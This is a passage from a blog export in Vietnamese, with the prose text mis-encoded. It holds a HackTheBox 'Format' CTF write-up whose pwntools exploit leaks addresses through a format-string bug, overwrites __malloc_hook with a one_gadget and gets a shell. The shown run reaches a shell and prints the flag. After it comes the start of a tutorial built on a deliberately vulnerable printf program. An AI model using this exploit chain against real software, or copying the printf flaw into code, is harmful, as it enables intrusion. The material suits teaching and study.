tr√™n stack. Ki·ªÉm tra c√°c gi√° tr·ªã n√†y v·ªõi l·ªánh x/i dia_chi  1 2 3 4 5 6 7 8 9 10  pwndbg\u0026gt; x/i 0x00005555555552d0\r0x5555555552d0 \u0026lt;__libc_csu_init\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x00005555555550c0\r0x5555555550c0 \u0026lt;_start\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x000055555555526d\r0x55555555526d \u0026lt;init+117\u0026gt;:\tnop\rpwndbg\u0026gt; x/i 0x00005555555552b3\r0x5555555552b3 \u0026lt;main+47\u0026gt;:\tmov eax,0x0\rpwndbg\u0026gt; x/i 0x00005555555550ee\r0x5555555550ee \u0026lt;_start+46\u0026gt;:\thlt\r   M·∫∑t kh√°c, l·ªói format-string c√≥ th·ªÉ cho ph√©p ch√∫ng ta dump d·ªØ li·ªáu tr√™n stack. Ch√∫ng ta s·∫Ω vi·∫øt 1 ƒëo·∫°n code nh·ªè ƒë·ªÉ dump d·ªØ li·ªáu t·ª´ stack ra.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  from pwn import *\r# HOST = \u0026#39;64.227.36.245\u0026#39;\r # PORT = 30730\r context.clear(arch=\u0026#34;amd64\u0026#34;)\r# -----------------------\r def com(payload, wait=True):\rglobal r\rr.sendline(payload)\rif (wait):\rreturn r.recv()\rdef nonStopLeak():\rdata = []\rmin_val = 1\rmax_val = 50\rlog.progress(\u0026#34;Starting nonStopLeaking (range: %dto %d)...\u0026#34; % (min_val, max_val))\rdata.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;)\rfor i in range(min_val, max_val):\rleak = \u0026#34;%{}$lx\u0026#34;.format(i)\rleak = com(leak).strip().decode()\rdata.append(leak)\rlog.success(\u0026#34;nonStopLeaking finalized...\u0026#34;)\rreturn data\r# -------------- exploit -----------------------\r elf = ELF(\u0026#34;format\u0026#34;)\rr = process(\u0026#34;./format\u0026#34;)\r# input(\u0026#34;[+] attach gdb\u0026#34;)\r # Launch the fmtstr exploiter\r exploiter = FmtStr(com)\rcollected_data = nonStopLeak()\rprint(collected_data)\rr.interactive()\r   Ti·∫øn h√†nh ch·∫°y, ta ƒë∆∞·ª£c k·∫øt qu·∫£:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ‚ûú Format git:(main) ‚úó python3 exploit.py\r[*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39;\rArch: amd64-64-little\rRELRO: Full RELRO\rStack: Canary found\rNX: NX enabled\rPIE: PIE enabled\r[+] Starting local process \u0026#39;./format\u0026#39;: pid 13390\r[+] attach gdb\r[*] Found format string offset: 6\r[‚ñÜ] Starting nonStopLeaking (range: 1 to 40)...\rexploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\rr.sendline(payload)\r[+] nonStopLeaking finalized...\r[\u0026#39;EMPTY ON PURPOSE\u0026#39;, \u0026#39;7f2bcf7e9a03\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf70f142\u0026#39;, \u0026#39;7fff990a1ad0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;61000a786c243625\u0026#39;, \u0026#39;6161616461616163\u0026#39;, \u0026#39;5241545361616165\u0026#39;, \u0026#39;444e457024362554\u0026#39;, \u0026#39;3800000000a\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf6936a5\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7eb4a0\u0026#39;, \u0026#39;7f2bcf68f6bd\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;7f2bcf685f65\u0026#39;, \u0026#39;55ddf1fb92d0\u0026#39;, \u0026#39;7fff990a1be0\u0026#39;, \u0026#39;55ddf1fb90c0\u0026#39;, \u0026#39;7fff990a1cf0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;55ddf1fb926d\u0026#39;, \u0026#39;7f2bcf7eefc8\u0026#39;, \u0026#39;cdd017be270afb00\u0026#39;]\r[*] Switching to interactive mode\r   T·∫°i ƒë√¢y, m√¨nh th·∫•y c√≥ gi√° tr·ªã 0x55ddf1fb926d l√† ƒë·ªãa ch·ªâ t·∫°i v·ªã tr√≠ init+117, m√¨nh s·∫Ω d√πng gi√° tr·ªã n√†y ƒë·ªÉ t√≠nh base address, bypass c∆° ch·∫ø ASLR v√† gi√° tr·ªã n√†y n√≥ n·∫±m ·ªü bye th·ª© 37.  1 2 3 4 5  ‚ûú Format git:(main) ‚úó ./format\r‚ûú Format git:(main) ‚úó ./format\r%37$p\r0x56406ae4f26d\r   Do c∆° ch·∫ø ASLR n√™n gi√° tr·ªã n√†y s·∫Ω kh√°c ·ªü m·ªói l·∫ßn ch·∫°y. B∆∞·ªõc th·ª© nh·∫•t, ch√∫ng ta s·∫Ω v∆∞·ª£t qua ƒë∆∞·ª£c c∆° ch·∫ø ASLR v·ªõi ƒëo·∫°n code sau:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  from pwn import *\r# HOST = \u0026#39;64.227.36.245\u0026#39;\r # PORT = 30730\r context.clear(arch=\u0026#34;amd64\u0026#34;)\r# -----------------------\r def com(payload, wait=True):\rglobal r\rr.sendline(payload)\rif (wait):\rreturn r.recv()\rdef nonStopLeak():\rdata = []\rmin_val = 1\rmax_val = 40\rlog.progress(\u0026#34;Starting nonStopLeaking (range: %dto %d)...\u0026#34; % (min_val, max_val))\rdata.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;)\rfor i in range(min_val, max_val):\rleak = \u0026#34;%{}$lx\u0026#34;.format(i)\rleak = com(leak).strip().decode()\rdata.append(leak)\rlog.success(\u0026#34;nonStopLeaking finalized...\u0026#34;)\rreturn data\r# -------------- exploit -----------------------\r elf = ELF(\u0026#34;./format\u0026#34;)\rinit_117 = 0x126d\rr = process(\u0026#34;./format\u0026#34;)\rinput(\u0026#34;[+] attach gdb\u0026#34;)\rpayload = b\u0026#39;%37$p\u0026#39;\rr.sendline(payload)\rinit_leak = r.recvline()\rlog.success(\u0026#34;LEAK : init+117 address: {}\u0026#34;.format(init_leak))\rbase_elf = int(init_leak,16) - 0x126d\rlog.info(\u0026#34;Base ELF address: {}\u0026#34;.format(hex(base_elf)))\relf.address = base_elf   B∆∞·ªõc 2: Leak ƒë·ªãa ch·ªâ __printf t·ª´ libc th√¥ng qua printf() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  pwndbg\u0026gt; disassemble echo\rDump of assembler code for function echo:\r0x0000559e0bc191a9 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc191ad \u0026lt;+4\u0026gt;:\tpush rbp\r0x0000559e0bc191ae \u0026lt;+5\u0026gt;:\tmov rbp,rsp\r0x0000559e0bc191b1 \u0026lt;+8\u0026gt;:\tsub rsp,0x110\r0x0000559e0bc191b8 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR fs:0x28\r0x0000559e0bc191c1 \u0026lt;+24\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax\r0x0000559e0bc191c5 \u0026lt;+28\u0026gt;:\txor eax,eax\r0x0000559e0bc191c7 \u0026lt;+30\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2e62] # 0x559e0bc1c030 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt;\r0x0000559e0bc191ce \u0026lt;+37\u0026gt;:\tlea rax,[rbp-0x110]\r0x0000559e0bc191d5 \u0026lt;+44\u0026gt;:\tmov esi,0x100\r0x0000559e0bc191da \u0026lt;+49\u0026gt;:\tmov rdi,rax\r0x0000559e0bc191dd \u0026lt;+52\u0026gt;:\tcall 0x559e0bc190a0 \u0026lt;fgets@plt\u0026gt;\r0x0000559e0bc191e2 \u0026lt;+57\u0026gt;:\tlea rax,[rbp-0x110]\r0x0000559e0bc191e9 \u0026lt;+64\u0026gt;:\tmov rdi,rax\r0x0000559e0bc191ec \u0026lt;+67\u0026gt;:\tmov eax,0x0\r0x0000559e0bc191f1 \u0026lt;+72\u0026gt;:\tcall 0x559e0bc19090 \u0026lt;printf@plt\u0026gt;\r0x0000559e0bc191f6 \u0026lt;+77\u0026gt;:\tjmp 0x559e0bc191c7 \u0026lt;echo+30\u0026gt;\rEnd of assembler dump.\rpwndbg\u0026gt; disassemble 0x559e0bc19090\rDump of assembler code for function printf@plt:\r0x0000559e0bc19090 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc19094 \u0026lt;+4\u0026gt;:\tbnd jmp QWORD PTR [rip+0x2f25] # 0x559e0bc1bfc0 \u0026lt;printf@got.plt\u0026gt;\r0x0000559e0bc1909b \u0026lt;+11\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0]\rEnd of assembler dump.\rpwndbg\u0026gt;    Ch√∫ng ta s·ª≠ d·ª•ng %s thay v√¨ %p b·ªüi v√¨ %s s·∫Ω ƒë·ªçc ƒë·ªãa gi√° tr·ªã b√™n trong v√πng nh·ªõ ƒë∆∞·ª£c truy·ªÅn v√†o printf v√† in ra cho ƒë·∫øn khi g·∫∑p gi√° tr·ªã null. ƒêi·ªÅu ƒë√≥ c√≥ nghƒ©a n·∫øu ƒë·ªãa ch·ªâ c·ªßa v√πng GOT ƒë∆∞·ª£c ƒë∆∞a v√†o th√¨ ch√∫ng ta c√≥ th·ªÉ in n√≥ s·∫Ω in ra ƒë·ªãa ch·ªâ c·ªßa libc ƒëang ch·ª©a trong n√≥. C·ª• th·ªÉ ch√∫ng ta s·∫Ω th·ª±c hi·ªán nh∆∞ sau:  1 2 3 4 5 6 7 8 9  ...\r# ------------- Leaking _printf address through printf()\r printf_got_ptl = elf.got[\u0026#34;printf\u0026#34;]\rlog.info(\u0026#34;printf@got.plt address: {}\u0026#34;.format(hex(printf_got_ptl)))\rr.sendline(b\u0026#39;AAAA%7$s\u0026#39; + p64(printf_got_ptl))\rprintf_leak = r.recv()\rprintf_libc = u64(printf_leak[4:10].ljust(8, b\u0026#39;\\x00\u0026#39;))\rlog.success(\u0026#34;Leaked __printf: {}\u0026#34;.format(hex(printf_libc)))\r...\r   Ch√∫ng ta l·∫•y ƒë·ªãa ch·ªâ printf@plt th√¥ng qua l·ªánh elf.got[\u0026quot;printf\u0026quot;], sau ƒë√≥ g·ª≠i payload c√≥ d·∫°ng \u0026quot;AAAA%7$s\u0026quot; + p64(printf_got_ptl). S·ªë 7 ·ªü ƒë√¢y l√† v√¨ ƒë·ªãa ch·ªâ c·ªßa got p64(printf_got_ptl) nƒÉm ·ªü v·ªã tr√≠ th·ª© 7 tr√™n stack, do ƒë√≥ %7s s·∫Ω l·∫•y ƒë·ªãa ch·ªâ n√†y ra v√† in gi√° tr·ªã ch·ª©a trong n√≥ c≈©ng ch√≠nh l√† ƒë·ªãa ch·ªâ libc. L·ªánh ljust(8, \u0026quot;\\x00\u0026quot;) ƒë∆∞·ª£c d√πng ƒë·ªÉ th√™m c√°c g√≠a tr·ªã \\x00 v√¨ c∆° ch·∫ø align  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ‚ûú Format git:(main) ‚úó python3 exploit.py\r[*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39;\rArch: amd64-64-little\rRELRO: Full RELRO\rStack: Canary found\rNX: NX enabled\rPIE: PIE enabled\r[+] Starting local process \u0026#39;./format\u0026#39;: pid 15866\r[+] attach gdb\r[+] LEAK : init+117 address: b\u0026#39;0x563d767e026d\\n\u0026#39;\r[*] Base ELF address: 0x563d767df000\r[*] printf@got.plt address: 0x563d767e2fc0\r[+] Leaked __printf: 0x7fc6d53d6e10\r[*] Stopped process \u0026#39;./format\u0026#39; (pid 15866)\r   S·ª≠ d·ª•ng libc.blukat.me v√† ƒë·ªãa ch·ªâ c·ªßa libc v·ª´a c√≥ ƒë∆∞·ª£c ƒë·ªÉ ki·ªÉm tra phi√™n b·∫£n c·ªßa libc.  B∆∞·ªõc 3 chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn  Khi ki·ªÉm tra v·ªõi checksec, ch√∫ng ta th·∫•y r·∫±ng binary ƒë∆∞·ª£c setup v·ªõi Full RELRO, ƒëi·ªÅu ƒë√≥ c√≥ nghƒ©a ch√∫ng ta kh√¥ng th·ªÉ ghi ƒë√® l√™n GOT, tuy nhi√™n n·ªôi dung c·ªßa th∆∞ vi·ªán libc ch√∫ng ta v·∫´n c√≥ th·ªÉ ghi ƒë·ª±c. Do ƒë√≥, m·ª•c ti√™u s·∫Ω ghi ƒë√® l√™n con tr·ªè __malloc_hook Khi ch√∫ng ta g·ª≠i v√†o printf() chu·ªói qu√° l·ªõn, __malloc_hook ƒë∆∞·ª£c g·ªçi b·∫•t c·ª© khi n√†o malloc() ƒë∆∞·ª£c d√πng. Ch√∫ng ta g·ªçi malloc() b·∫±ng c√°ch g·ªçi printf(\u0026quot;%100000$c\u0026quot;), l·ªánh g·ªçi n√†y s·∫Ω c·∫•p ph√°t nhi·ªÅu byte tr√™n stack v√† bu·ªôc libc ph·∫£i c·∫•p ph√°t th√™m v√πng nh·ªõ tr√™n heap thay v√¨ tr√™n stack. Khi ƒë√≥, ch√∫ng ta c√≥ th·ªÉ ghi ƒë√® gi√° tr·ªã c·ªßa __malloc_hook b·∫±ng %6n v√† thay AAAA ƒë·∫ßu th√†nh ƒë·ªãa ch·ªâ c·ªßa __malloc_hook. Ch√∫ng ta s·ª≠ d·ª•ng kƒ© thu·∫≠t one_gadget ƒë·ªÉ th·ª±c thi execve(\u0026quot;/bin/sh\u0026quot;) trong libc.  1 2 3 4 5 6 7 8 9 10 11 12 13  ‚ûú Format git:(main) ‚úó one_gadget libc6_2.27-3ubuntu1_amd64.so\r0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ)\rconstraints:\rrsp \u0026amp; 0xf == 0\rrcx == NULL\r0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ)\rconstraints:\r[rsp+0x40] == NULL\r0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ)\rconstraints:\r[rsp+0x70] == NULL\r   Ti·∫øp theo, ch√∫ng ta t√≠nh c√°c ƒë·ªãa ch·ªâ c·∫ßn thi·∫øt. V·ªõi libc khi ch∆∞a ch·∫°y, ch√∫ng ta ƒë·ªçc ƒë·ªãa ch·ªâ c·ªßa printf:  1 2  ‚ûú Format git:(main) ‚úó objdump -TR libc6_2.27-3ubuntu1_amd64.so| grep \u0026#34; printf$\u0026#34;\r0000000000064e80 g DF .text 00000000000000c3 GLIBC_2.2.5 printf\r  Ch√∫ng ta th·∫•y r·∫±ng kho·∫£ng c√°ch t·ª´ printf t·ªõi base address l√† 0x64e80, do ƒë√≥, ƒë·ªÉ t√≠nh base address, ch√∫ng ta l·∫•y ƒë·ªãa ch·ªâ c·ªßa printf leak ƒë∆∞·ª£c khi th·ª±c thi tr·ª´ ƒëi 0x64e80.\n Sau khi c√≥ ƒë∆∞·ª£c base address, ch√∫ng ta t√≠nh ƒë·ªãa ch·ªâ c·ªßa malloc_hook_addr v√† one_gadget b·∫±ng c√°ch l·∫•y base address c·ªông v·ªõi kho·∫£ng c√°ch c·ªßa c√°c h√†m (l·∫•y b·∫±ng c√°ch ƒë·ªçc static)  1 2 3 4  # Calculating base libc, __malloc_hook and one_gadget ---\r base_libc = printf_libc - 0x64e80\rmalloc_hook_addr = base_libc + 0x00000000003ebc30\rone_gadget = base_libc + 0x4f322\r   Ta s·ª≠ d·ª•ng pwnlib.fmtstr - c√¥ng c·ª• khai th√°c l·ªói format string ƒë·ªÉ t√≠nh v√† ghi ƒë√® ƒë·ªãa ch·ªâ __malloc_hook v·ªõi one gadget v√† k√≠ch ho·∫°t n√≥.  1 2 3 4 5 6  # Overriding __malloc_hook with one_gadget ---\r p.sendline(fmtstr_payload(6, {malloc_hook_addr: one_gadget}))\rp.recv()\rp.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger\r p.interactive()\rp.close()\r  B∆∞·ªõc 4 - Ch·∫°y m√£ khai th√°c  Ch·∫°y m√£ khai th√°c, ta c√≥ ƒë∆∞·ª£c  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ‚ûú Format git:(main) ‚úó python3 exploit.py\r[*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39;\rArch: amd64-64-little\rRELRO: Full RELRO\rStack: Canary found\rNX: NX enabled\rPIE: PIE enabled\r[+] Opening connection to 167.99.202.131 on port 32399: Done\r[+] LEAK : init+117 address: b\u0026#39;0x55afb922b26d\\n\u0026#39;\r[*] Base ELF address: 0x55afb922a000\r[*] printf@got.plt address: 0x55afb922dfc0\r[+] Leaked __printf: 0x7f6b96c3be80\rexploit.py:65: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\r r.sendline(\u0026#39;%100000$c\u0026#39;) # __malloc_hook trigger\r [*] trigged malloc_hook\r[*] Switching to interactive mode\r$ ls\rflag.txt\rformat\rrun_challenge.sh\r$ cat flag.txt\rHTB{mall0c_h00k_f0r_th3_w1n!}\r$ [*] Interrupted\r[*] Closed connection to 167.99.202.131 port 32399\r‚ûú Format git:(main) ‚úó    M√£ khai th√°c: exploit.py  Ngu·ªìn tham kh·∫£o  https://karol-mazurek95.medium.com/pwn-format-challenge-htb-3a7e6351ff3a https://github.com/luisrodrigues154/Cyber-Security/blob/master/HackTheBox/Challenges/Pwn/Format/notes.md  ","description":"Can you hear the echo? ","id":2,"section":"posts","tags":["exploitation"],"title":"Hackthebox- Format","uri":"https://minhlongmt183.github.io/posts/htb_format/"},{"content":"M·ªü ƒë·∫ßu Khai th√°c l·ªói format string l√† m·ªôt kƒ© thu·∫≠t cho ph√©p ch√∫ng ta chi·∫øm quy·ªÅn ki·ªÉm so√°t c·ªßa m·ªô ch∆∞∆°ng tr√¨nh ƒë·∫∑c quy·ªÅn. Gi·ªëng nh∆∞ buffer overflow, format string c≈©ng ph·ª• thu·ªôc v√†o l·ªói khi l·∫≠p tr√¨nh, nh·ªØng l·ªói n√†y khi nh√¨n s∆° qua th√¨ kh√¥ng th·∫•y c√≥ ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn ch∆∞∆°ng tr√¨nh.\nN·ªôi dung ch√≠nh Format Paraameters  1 function s·ª≠ d·ª•ng ƒë·ªãnh d·∫°ng chu·ªói, nh∆∞ l√† prrintf(), ch·ªâ c·∫ßn xem x√©t ƒë·ªãnh d·∫°ng ƒë∆∞·ª£c truy·ªÅn v√†o n√≥ v√† th·ª±c hi·ªán nh·ªØng ho·∫°t ƒë·ªông ƒë·∫∑c bi·ªát m·ªói khi g·∫∑p ph·∫£i tham s·ªë truy·ªÅn v√†o. M·ªói tham s·ªë ƒë·ªãnh d·∫°ng chu·ªói th√¨ t∆∞∆°ng ·ª©ng v·ªõi m·ªôt tham s·ªë truy·ªÅn v√†o, v√≠ d·ª• chu·ªói ch√∫ng ta s·ª≠ d·ª•ng 4 tham s·ªë ƒë·ªãnh d·∫°ng th√¨ c·∫ßn ph·∫£i truy·ªÅn 4 bi·∫øn t∆∞∆°ng ∆∞ng. Nh·ªØng d·∫°ng ƒë·ªãnh d·∫°ng tham s·ªë th∆∞·ªùng g·∫∑p:     Parameter Input Type Output Type     %d Value Decimal   %u Value Unsigned decimal   %x Value Hexadecimal   %s Pointer String   %n Pointer Number of bytes written so far     Ch√∫ng ta s·∫Ω th·ª≠ v·ªõi ch∆∞∆°ng tr√¨nh sau:  fmt_uncommon.c\n1 2 3 4 5 6 7 8 9 10 11 12  #include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\rint main() {\rint A = 5, B = 7, count_one, count_two;\r// Example of a %n format string\r printf(\u0026#34;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\u0026#34;, \u0026amp;count_one, \u0026amp;count_two);\rprintf(\u0026#34;count_one: %d\\n\u0026#34;, count_one);\rprintf(\u0026#34;count_two: %d\\n\u0026#34;, count_two);\r// Stack example\r printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B);\rexit(0);\r}    Ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng ƒë·ªãnh d·∫°ng %n trong h√†m printf(). Ch√∫ng ta ch·∫°y v√† xem output nh∆∞ th·∫ø n√†o.  1 2 3 4 5 6 7 8 9 10 11 12 13 14  ‚ûú fmt git:(main) ‚úó gcc fmt_uncommon.c fmt_uncommon.c: In function ‚Äòmain‚Äô:\rfmt_uncommon.c:14:34: warning: format ‚Äò%x‚Äô expects argument of type ‚Äòunsigned int‚Äô, but argument 3 has type ‚Äòint *‚Äô [-Wformat=]\r14 | printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B);\r| ~~~^ ~~\r| | |\r| unsigned int int *\r| %08ls\r‚ûú fmt git:(main) ‚úó ./a.out The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\rcount_one: 46\rcount_two: 113\rA is 5 and is at c6658b68. B is 7.\r‚ûú fmt git:(main) ‚úó    %n l√† ƒë·ªãnh d·∫°ng duy nh·∫•t d√πng ƒë·ªÉ ghi d·ªØ li·ªáu thay v√¨ hi·ªÉn th·ªã d·ªØ li·ªáu. Khi h√†m ƒë·ªãnh d·∫°ng g·∫∑p tham s·ªë %n, n√≥ s·∫Ω vi·∫øt t·ªïng s·ªë byte m√† n√≥ ƒë√£ ƒë∆∞·ª£c vi·∫øt b·ªüi h√†m v√†o ƒë·ªãa ch·ªâ t∆∞∆°ng ·ª©ng c·ªßa bi·∫øn. V√≠ d·ª• v·ªõi h√†m fmt_common tr√™n, A c√≥ gi√° tr·ªã l√† 46 b·ªüi v√¨ t·ªïng s·ªë byte m√† h√†m printf ƒë√£ in ra cho t·ªõi khi g·∫∑p %n l√† 46 k√≠ t·ª±:  1 2 3 4  \u0026gt;\u0026gt;\u0026gt; la = \u0026#34;The number of bytes written up to this point X\u0026#34;\r\u0026gt;\u0026gt;\u0026gt; len(la)\r46\r   Xem x√©t c√¢u l·ªánh sau:  1  printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B);\r   Khi h√†m printf() ƒë∆∞·ª£c g·ªçi, c√°c tham s·ªë ƒë∆∞·ª£c d∆∞a v√†o stack theo th·ª© t·ª± ng∆∞·ª£c l·∫°i:     Top of the Stack     Address of format string   Value of A   Address of A   Value of B   Bottom of the Stack     H√†m printf s·∫Ω ƒëi qua t·ª´ng k√≠ t·ª± m·ªôt, n·∫øu k√≠ t·ª± kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng m·ªôt format-parameter, k√≠ t·ª± n√†y s·∫Ω ƒë∆∞·ª£c copy ra output. N·∫øu m·ªôt format-parameter ƒë∆∞·ª£c g·∫∑p, n√≥ s·∫Ω l·∫•y gi√° tr·ªã c·ªßa ƒë·ªëi s·ªë trong stack t∆∞∆°ng ·ª©ng v·ªõi parameter. Trong tr∆∞·ªùng h·ª£p s·ªë argeument trong stack √≠t h∆°n s·ªë format-parameter trong string th√¨ ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra? V√≠ d·ª•:  1  printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A);\r   Ta s·∫Ω ti·∫øn h√†nh thay ƒë·ªïi 1 t√≠ ·ªü ch∆∞∆°ng tr√¨nh fmt_uncommon2.c  1 2 3 4 5 6 7 8  ‚ûú fmt git:(main) ‚úó sed -e \u0026#39;s/, B)/)/\u0026#39; fmt_uncommon.c \u0026gt; fmt_uncommon2.c\r‚ûú fmt git:(main) ‚úó diff fmt_uncommon.c fmt_uncommon2.c 14c14\r\u0026lt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A, B);\r---\r\u0026gt; printf(\u0026#34;A is %d and is at %08x. B is %x.\\n\u0026#34;, A, \u0026amp;A);\r‚ûú fmt git:(main) ‚úó    Compile v√† ch·∫°y, xem k·∫øt qu·∫£:  1 2 3 4 5 6 7 8  ‚ûú fmt git:(main) ‚úó gcc -o fmt_uncommon2 fmt_uncommon2.c -w\r‚ûú fmt git:(main) ‚úó ./fmt_uncommon2\rThe number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\rcount_one: 46\rcount_two: 113\rA is 5 and is at 74f2e9b8. B is 0.\r   Ch√∫ng ta d√πng -w ƒë·ªÉ t·∫Øt ƒëi nh·ªØng warning t·ª´ compiler. Khi ch·∫°y, ta th·∫•y B l√∫c b√¢y gi·ªù c√≥ gi√° tr·ªã l√† 0. T·∫°i sao B l·∫°i c√≥ gi√° tr·ªã l√† 0 trong khi gi√° tr·ªã kh·ªüi t·∫°o c·ªßa B l√† 7? Ta ƒë√£ bi·∫øt r·∫±ng, khi h√†m printf() g·ªçi, n√≥ s·∫Ω ƒë·∫©y c√°c ƒë·ªëi s·ªë v√†o trong stack v√† khi g·∫∑p format-parameter, n√≥ s·∫Ω v√†o stack v√† l·∫•y gi√° tr·ªã n√†y ra. Tuy nhi√™n, trong tr∆∞·ªùng h·ª£p n√†y, s·ªë format-parameter l·∫°i nhi·ªÅu h∆°n argument, n√™n ƒë·∫øn tham s·ªë th·ª© 3, h√†m printf c≈©ng v√†o stack ƒë·ªÉ l·∫•y gi√° tr·ªã t·∫°i v·ªã tr√≠ th·ª© 3 tr√™n stack. 0 l√† gi√° tr·ªã ƒë·∫ßu ti√™n m√† h√†m printf t√¨m th·∫•y tr√™n stack.  The Format String Vulnerability  ƒê√¥i khi programmer s·ª≠ d·ª•ng printf(string) thay v√¨ printf(\u0026quot;%s\u0026quot;, string). L√∫c n√†y, h√†m printf s·∫Ω nh·∫≠n tr·ª±c ti·∫øp ƒë·ªãa ch·ªâ c·ªßa string v√† in t·ª´ng k√≠ t·ª± trong string ƒë√≥. ƒêo·∫°n code sau th·ªÉ hi·ªán ho·∫°t ƒë·ªông c·ªßa 2 c√°ch s·ª≠ d·ª•ng n√†y.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\r\rint main(int argc, char *argv[]) {\rchar text[1024];\rstatic int test_val = -72;\rif (argc \u0026lt; 2) {\rprintf(\u0026#34;Usage: %s \u0026lt;text to print\u0026gt;\\n\u0026#34;, argv[0]);\rexit(0);\r}\rstrcpy(text. argv[1]);\rprintf(\u0026#34;The right way to print user-controlled input:\\n\u0026#34;);\rprintf(\u0026#34;%s\u0026#34;, text);\rprintf(\u0026#34;\\nThe wrong way to print user-controlled input:\\n\u0026#34;);\rprintf(text);\rprintf(\u0026#34;\\n\u0026#34;);\r// Debug output\r\tprintf(\u0026#34;[*] test_val @ 0x%08x = %d 0x%08x\\n\u0026#34;, \u0026amp;test_val, test_val, test_val);\rexit(0);\r}\r   Ti·∫øn h√†nh bi√™n d·ªãch v√† xem k·∫øt qu·∫£:  1 2 3 4 5 6 7 8 9  ‚ûú fmt git:(main) ‚úó gcc -o fmt_vuln fmt_vuln.c -w ‚ûú fmt git:(main) ‚úó ./fmt_vuln hello_world\rThe right way to print user-controlled input:\rhello_world\rThe wrong way to print user-controlled input:\rhello_world\r[*] test_val @ 0x8a756010 = -72 0xffffffb8\r   V·ªõi input l√† hello_world, c·∫£ 2 c√°ch ƒë·ªÅu ho·∫°t ƒë·ªông t·ªët. Tuy nhi√™n, n·∫øu input nh·∫≠p v√†o ch·ª©a format parameter li·ªáu c·∫£ 2 c√≥ nh∆∞ nhau hay kh√¥ng?  1 2 3 4 5 6  ‚ûú fmt git:(main) ‚úó ./fmt_vuln hello_world%x The right way to print user-controlled input:\rhello_world%x\rThe wrong way to print user-controlled input:\rhello_world128012a0\r[*] test_val @ 0x10ff0010 = -72 0xffffffb8\r   T·ª´ output tr√™n ta th·∫•y, v·ªõi c√°ch d√πng th·ª© 2, gi√° tr·ªã tr√™n stack ƒë√£ ƒë∆∞·ª£c in ra. V·ªõi m·ªói tham s·ªë %x ƒë∆∞·ª£c s·ªß d·ª•ng, 4 bytes tr√™n stack s·∫Ω ƒë∆∞·ª£c in ra. Do ƒë√≥, n·∫øu l·∫∑p l·∫°i qu√° tr√¨nh n√†y, ch√∫ng ta c√≥ th·ªÉ l·∫•y to√†n b·ªô d·ªØ li·ªáu tr√™n stack.  1 2 3 4 5 6 7  ‚ûú fmt git:(main) ‚úó ./fmt_vuln $(perl -e \u0026#39;print \u0026#34;%08x.\u0026#34;x40\u0026#39;)\rThe right way to print user-controlled 